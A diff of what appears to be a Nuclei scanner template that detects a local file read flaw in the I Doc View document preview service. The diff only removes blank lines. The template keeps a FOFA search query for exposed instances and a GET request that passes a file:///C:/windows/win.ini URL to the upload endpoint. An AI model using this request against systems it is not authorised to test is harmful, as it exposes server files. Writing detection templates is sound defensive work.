@@ -9,12 +9,10 @@ info:
     max-request: 1
     fofa-query: title=="在线文档预览 - I Doc View"
   tags: idoc,lfi,file-read
-
 variables:
   file: "{{to_lower(rand_text_alpha(5))}}"
 
 http:
-
   - method: GET
     path:
       - "{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt"
